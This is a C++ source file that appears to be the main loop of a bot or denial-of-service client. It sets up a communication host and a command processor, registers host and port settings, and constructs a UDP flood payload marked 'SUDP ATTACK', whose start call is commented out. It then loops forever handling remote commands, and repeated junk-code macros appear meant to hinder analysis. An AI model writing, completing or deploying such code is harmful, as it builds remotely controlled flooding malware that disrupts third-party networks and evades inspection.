#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "Core/CommonIncludes.h"
#include "Core/Communication/CommunicationMainFrame.h"
#include "Core/PropertyManager.h"
#include "Core/Commands/CommandManager.h"
#include "Payloads/PayloadSUDP.h"
void init() {

	PropertyManager pm;
	CommunicationMainFrame cmf;
	CommandManager cmd;
	_JUNK_BLOCK(jmp_label1)
		cmf.initializeComunicationHost();
	
	
	_JUNK_BLOCK(jmp_label253)
	//Init all default CProperties
	CProperty<int> debug{ std::string("cl_debug"), 1 };
	CProperty<std::string> host{ std::string("cl_host"), std::string("127.0.0.1") };
	CProperty<std::string> port{ std::string("cl_port"), std::string("8080") };


	//Register all default CProperties
	pm.registerProperty(debug);
	pm.registerProperty(host);
	pm.registerProperty(port);


	if (pm.exist(std::string("cl_debug"))) {
		if (pm.exist(std::string("cl_host")))
		{
			Property *p_host = &pm.getPropertyByName(std::string("cl_host"));
			CProperty<std::string>* host = (CProperty<std::string> *)p_host;

			Property *p_port = &pm.getPropertyByName(std::string("cl_port"));
			CProperty<std::string>* port = (CProperty<std::string> *)p_port;

			std::cout << "Host address: " << host->getValue() << " \n";
			std::cout << "Host port: " << port->getValue() << " \n";

			PayloadSUDP psudp { std::string("sudp"),std::string("127.0.0.1"),80,8,0 }; //SUDP ATTACK ON LOCAL HOST. USE psudp.init(); to start

			//psudp.init();
		}
	}

	_JUNK_BLOCK(jmp_label3)
	while (true) {

		for (int i = 0; i < 2+(rand() % 10); i++) {
			_JUNK_BLOCK(jmp_label5)
				i = i;
		}

		_JUNK_BLOCK(jmp_label4)
			cmf.updateEvent();
		_JUNK_BLOCK(jmp_label215)
			cmd.processCommands();
	}
}

int main()
{
	init();
}